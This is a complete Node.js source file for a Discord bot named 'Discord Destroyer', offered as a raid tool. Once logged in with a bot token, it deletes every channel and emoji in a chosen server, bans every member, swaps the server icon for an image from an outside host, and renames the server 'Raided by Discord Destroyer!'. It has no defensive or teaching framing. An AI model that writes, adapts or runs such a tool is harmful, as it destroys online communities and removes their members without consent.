// Initialise a client and Discord object.
const Discord = require("discord.js");
const client = new Discord.Client();

// Get Discord Destroyer version.
const packageVersion = require("./package.json").version;

// Settings for the bot.
const settings = {
    botToken: "YOUR TOKEN HERE",
    guildID: "YOUR GUILD ID HERE",
    guildName: "Raided by Discord Destroyer!",
};

console.info(`\x1b[44mINFO\x1b[0m: Starting Discord Destroyer, Version: ${packageVersion}. ~(˘▾˘~)`);

// Once the bot is ready start destroying the guild!
client.once('ready', () => {
    // Success msg.
    console.info(`\x1b[44mINFO\x1b[0m: Logged in as ${client.user.tag}. (^o^)／`);

    // Get the guild using the ID.
    let guild = client.guilds.get(settings.guildID);

    // Delete all channels.
    guild.channels.forEach(c => {
        c.delete();
        console.info(`\x1b[44mINFO\x1b[0m: Deleted channel ${c.name}; ID: ${c.id}. (╯°□°）╯︵ ┻━┻`);
    });

    // Delete all emojis.
    guild.emojis.forEach(e => {
        guild.deleteEmoji(e);
        console.info(`\x1b[44mINFO\x1b[0m: Deleted emoji ${e.name}; ID: ${e.id}. (╯°□°）╯︵ ┻━┻`);
    });

    // Ban all users.
    guild.members.forEach(m => {
        m.ban();
        console.info(`\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`);
    });

    // Set the guild icon to nothing.
    guild.setIcon("https://china.hacked-my.computer/95314b55.png");

    // Set the guild name to the desired name.
    guild.setName(settings.guildName);
});

// Login into the bot using a timer.
setTimeout(function () {
    console.log("\x1b[31m3\x1b[0m");
    setTimeout(function () {
        console.log("\x1b[33m2\x1b[0m");
        setTimeout(function () {
            console.log("\x1b[32m1\x1b[0m");
            setTimeout(function () {
                console.log("\x1b[37m\x1b[1mGO\x1b[0m");
                client.login(settings.botToken);
            }, 1000)
        }, 1000)
    }, 1000)
}, 1000)

// Some what handle uncaught exceptions.
process.on("uncaughtException", err => {
    console.error("\x1b[41mERROR\x1b[0m: An unknown and unexpected error occurred! x.x\n", err);
    process.exit(1);
});

// Some what handle unhandled rejections.
process.on("unhandledRejection", err => {
    console.error("\x1b[41mERROR\x1b[0m: An unknown and unexpected error occurred! x.x\n", err);
    process.exit(1);
});
